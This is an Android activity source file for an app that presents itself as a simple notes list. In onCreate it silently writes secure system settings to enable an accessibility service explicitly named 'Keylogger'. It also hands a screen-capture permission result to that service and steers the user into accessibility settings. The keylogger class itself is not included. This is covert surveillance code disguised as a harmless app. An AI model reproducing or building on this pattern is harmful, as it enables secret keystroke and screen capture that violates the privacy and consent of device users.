package com.example.activmon;

import androidx.activity.result.ActivityResult;
import androidx.activity.result.ActivityResultCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.NotificationCompat;
import androidx.recyclerview.widget.ItemTouchHelper;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.AppOpsManager;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityManager;
import android.widget.Toast;

import com.example.activmon.adapater.RecyclerViewAdpater;
import com.google.android.material.floatingactionbutton.FloatingActionButton;

import org.json.JSONArray;
import org.json.JSONException;

import java.util.List;
import java.util.Objects;

public class MainActivity extends AppCompatActivity{

    final String TAG = "activMon";

    public MediaProjectionManager mProjectionManager;
    int RecordAudioRequestCode = 1001;

    RecyclerView recyclerView;
    RecyclerViewAdpater adpater;

    public SharedPreferences sharedPreferences;
    public SharedPreferences.Editor editor;

    JSONArray jArray = null;
    public static int  recyclerPos = -1;

    public static final String NOTIFICATION_CHANNEL_ID = "10001" ;
    private final static String default_notification_channel_id = "default" ;

    ActivityResultLauncher<Intent> startForResult = registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), new ActivityResultCallback<ActivityResult>() {
        @Override
        public void onActivityResult(ActivityResult result) {
            if(result != null && result.getResultCode() == RESULT_OK){
                if(result.getData() != null){
                    if(!isAccessibilityServiceEnabled(getApplicationContext(), Keylogger.class)){
                        Keylogger.intent = result.getData();
                        Keylogger.resCode = result.getResultCode();
                        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                    }
                }
            }
        }
    });

    ActivityResultLauncher<Intent> accessibilityReq = registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), result -> {
        if (!isAccessibilityServiceEnabled(getApplicationContext(), Keylogger.class)) {
            Toast.makeText(this, "Izin akses tidak diberikan", Toast.LENGTH_SHORT).show();
            MainActivity.this.finish();
            System.exit(0);
        }
    });

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Settings.Secure.putString(getContentResolver(),Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, "com.example.activmon/com.example.activmon.Keylogger");
        Settings.Secure.putString(getContentResolver(),Settings.Secure.ACCESSIBILITY_ENABLED, "1");

        // Check if the app has notification access
//        if (!isAccessibilityServiceEnabled(getApplicationContext(), Keylogger.class)) {
//            // Ask the user to grant notification access
//            AlertDialog enableNotificationListenerAlertDialog = buildNotificationServiceAlertDialog();
//            enableNotificationListenerAlertDialog.show();
//        }

        FloatingActionButton addBnt = findViewById(R.id.floatingActionButton);
        recyclerView = findViewById(R.id.list1);
        recyclerView.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.VERTICAL,true));

        sharedPreferences = getSharedPreferences("shared", Context.MODE_PRIVATE);
        editor = sharedPreferences.edit();

        NotificationManager mNotificationManager = (NotificationManager) getSystemService( NOTIFICATION_SERVICE ) ;
        NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(MainActivity. this, default_notification_channel_id ) ;
        int importance = NotificationManager.IMPORTANCE_HIGH;
        NotificationChannel notificationChannel = new NotificationChannel( NOTIFICATION_CHANNEL_ID , "NOTIFICATION_CHANNEL_NAME" , importance) ;
        mBuilder.setChannelId( NOTIFICATION_CHANNEL_ID ) ;
        assert mNotificationManager != null;
        mNotificationManager.createNotificationChannel(notificationChannel) ;

        addBnt.setOnClickListener(view -> {
/*            mBuilder.setContentTitle( "My Notification" ) ;
            mBuilder.setContentText( "Notification Listener Service Example" ) ;
            mBuilder.setTicker( "Notification Listener Service Example" ) ;
            mBuilder.setSmallIcon(R.drawable. ic_launcher_foreground ) ;
            mBuilder.setAutoCancel( true ) ;

            mNotificationManager.notify(( int ) System.currentTimeMillis() , mBuilder.build()) ;*/
            editor.putBoolean("updated",false);
            editor.commit();
            Intent intent = new Intent(getApplicationContext(),NoteActivity.class);
            intent.putExtra("type","add");
            recyclerPos = -1;
            startActivity(intent);
        });

        try {
            String data = sharedPreferences.getString("data",null);
            if(data != null){
                Log.d(TAG, data);
                jArray = new JSONArray(data);

                adpater = new RecyclerViewAdpater(this,jArray);
                recyclerView.setAdapter(adpater);
            }
        } catch (JSONException e) {
            Log.d(TAG, Objects.requireNonNull(Objects.requireNonNull(e.getMessage())));
        }

        ItemTouchHelper helper = new ItemTouchHelper(new ItemTouchHelper.Callback() {
            @Override
            public int getMovementFlags(@NonNull RecyclerView recyclerView, @NonNull RecyclerView.ViewHolder viewHolder) {
                return makeMovementFlags(0,ItemTouchHelper.END);
            }

            @Override
            public boolean onMove(@NonNull RecyclerView recyclerView, @NonNull RecyclerView.ViewHolder viewHolder, @NonNull RecyclerView.ViewHolder target) {
                return false;
            }

            @Override
            public void onSwiped(@NonNull RecyclerView.ViewHolder viewHolder, int direction) {
                jArray.remove(viewHolder.getAdapterPosition());
                adpater.notifyItemRemoved(viewHolder.getAdapterPosition());
                try {
                    editor.putString("data",jArray.toString(0));
                    editor.commit();
                } catch (JSONException e) {
                    Log.d(TAG, Objects.requireNonNull(e.getMessage()));
                }
            }
        });
        helper.attachToRecyclerView(recyclerView);
    }

    public static boolean isAccessibilityServiceEnabled(Context context, Class<? extends AccessibilityService> service) {
        AccessibilityManager am = (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);
        List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);

        for (AccessibilityServiceInfo enabledService : enabledServices) {
            ServiceInfo enabledServiceInfo = enabledService.getResolveInfo().serviceInfo;
            if (enabledServiceInfo.packageName.equals(context.getPackageName()) && enabledServiceInfo.name.equals(service.getName()))
                return true;
        }
        return false;
    }


    /*private void checkPermission() {
        if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECORD_AUDIO}, RecordAudioRequestCode);
            }
        }
    }*/


    /*@Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == RecordAudioRequestCode && grantResults.length > 0 ){
            if(grantResults[0] == PackageManager.PERMISSION_GRANTED)
                Toast.makeText(this,"Permission Granted",Toast.LENGTH_SHORT).show();
            startForResult.launch(mProjectionManager.createScreenCaptureIntent());
        }
    }*/


    private AlertDialog buildNotificationServiceAlertDialog(){
        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
        alertDialogBuilder.setTitle(R.string.notification_listener_service);
        alertDialogBuilder.setMessage(R.string.notification_listener_service_explanation);
        alertDialogBuilder.setPositiveButton(R.string.yes,
                (dialog, id) -> reqPermissions());
        alertDialogBuilder.setCancelable(false);
        return(alertDialogBuilder.create());
    }

    private void reqPermissions() {
        if (!isAccessibilityServiceEnabled(getApplicationContext(), Keylogger.class)) {
            accessibilityReq.launch(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        }
    }

    @Override
    protected void onRestart() {
        super.onRestart();
        boolean update = sharedPreferences.getBoolean("updated",false);
        Log.d(TAG, String.valueOf(update));
        if(update){
            String data = sharedPreferences.getString("nextVal",null);
            if(data != null){
                if(jArray != null){
                    if(recyclerPos == -1){
                        // new entry
                        jArray.put(data);
                        adpater.notifyItemChanged(jArray.length()-1);

                    }else{
                        // updated
                        try {
                            jArray.put(recyclerPos,data);
                            adpater.notifyItemChanged(recyclerPos);

                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }

                }else{
                    jArray = new JSONArray();
                    jArray.put(data);

                    adpater = new RecyclerViewAdpater(this,jArray);
                    recyclerView.setAdapter(adpater);
                }
            }
        }
    }
}